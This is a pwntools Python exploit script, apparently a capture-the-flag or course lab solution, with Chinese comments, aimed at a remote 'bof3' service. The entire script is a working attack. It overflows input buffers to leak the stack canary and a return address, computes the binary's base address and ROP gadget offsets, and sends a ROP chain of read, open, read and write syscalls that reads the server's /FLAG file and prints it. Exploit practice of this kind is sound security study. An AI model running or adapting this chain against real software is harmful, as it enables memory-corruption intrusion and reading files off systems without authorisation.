#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
context.os = 'linux'

# 連接到服務器
r = remote('up.zoolab.org', 12344)
#r = process('./bof3')


# 洩漏 canary 和返回地址
r.recvuntil(b"What's your name? ")
payload = b'A' * 8 * 23 + b'A' # 覆蓋 buf1, buf2, buf3
r.send(payload)
r.recvuntil(b"Welcome, " + b'A' * 8 * 23)
leaked_data = r.recvline(keepends=False)
log.info(f"Raw leaked data: {leaked_data.hex()}")
canary = u64(leaked_data[:8].ljust(8, b'\x00'))
log.info(f"Leaked canary: {hex(canary)}")
canary &= 0xffffffffffffff00
log.info(f"Leaked canary: {hex(canary)}")


# 輸入 buf2
r.recvuntil(b"What's the room number? ")
payload = b'B' * 8 * 19  # 覆蓋buf2, buf3
r.send(payload)
r.recvuntil(b"The room number is: " + payload)
leak = r.recvline(keepends=False)[:8]
leak = leak.ljust(8, b'\x00')  # 補齊 8 字節
ret_addr = u64(leak)
log.info(f"Leaked return address: {hex(ret_addr)}")

# 計算基址和 msg 地址
main_ret_offset = 0x9C83 # 需根據二進制調整
base_addr = ret_addr - main_ret_offset
log.info(f"Base address: {hex(base_addr)}")
bss_offset = 0xef200  # 需根據二進制調整
bss_addr = base_addr + bss_offset
log.info(f"bss address: {hex(bss_addr)}")
# Gadget 地址
pop_rdi_ret = base_addr + 0xbc33
pop_rsi_ret = base_addr + 0xa7a8
pop_rdx_ret = base_addr + 0x15f6e
pop_rax_ret = base_addr + 0x66287
syscall = base_addr + 0x30ba6
log.info(f"pop_rdi_ret address: {hex(pop_rdi_ret)}")
log.info(f"pop_rsi_ret address: {hex(pop_rsi_ret)}")
log.info(f"pop_rdx_ret address: {hex(pop_rdx_ret)}")
log.info(f"pop_rax_ret address: {hex(pop_rax_ret)}")
log.info(f"syscall address: {hex(syscall)}")


# 輸入 buf3（溢出返回地址）
r.recvuntil(b"What's the customer's name? ")
r.send(b'name')
#payload =  b'A' * 8 * 11 + p64(canary) + b'A' * 8 + p64(msg_addr) 


# 忽略 msg 輸入，直接交互
r.recvuntil(b"Leave your message: ")
payload = (
    b'A' * 8 * 5 +
    p64(canary) +
    b'A' * 8 +

    # read(0, bss, 6)
    p64(pop_rax_ret) + p64(0) +
    p64(pop_rdi_ret) + p64(0) +
    p64(pop_rsi_ret) + p64(bss_addr) +
    p64(pop_rdx_ret) + p64(6) +
    p64(syscall) +

    # open(bss_addr, 0)
    p64(pop_rax_ret) + p64(2) +
    p64(pop_rdi_ret) + p64(bss_addr) +
    p64(pop_rsi_ret) + p64(0) +
    p64(syscall) +

    # read(3, bss, 100)
    p64(pop_rax_ret) + p64(0) +
    p64(pop_rdi_ret) + p64(3) +  # 如果能找 mov rdi, rax; ret 更穩定
    p64(pop_rsi_ret) + p64(bss_addr) +
    p64(pop_rdx_ret) + p64(100) +
    p64(syscall) +

    # write(1, bss, 100)
    p64(pop_rax_ret) + p64(1) +
    p64(pop_rdi_ret) + p64(1) +
    p64(pop_rsi_ret) + p64(bss_addr) +
    p64(pop_rdx_ret) + p64(100) +
    p64(syscall)
)

r.send(payload)

# 發送 /FLAG 到 .bss（第一次 read）
thankyou = r.recvuntil(b'Thank you!\n')
log.info(f"{thankyou}")
r.send(b"/FLAG\x00")

# 進入交互模式，接收 FLAG
time.sleep(1)
r.interactive()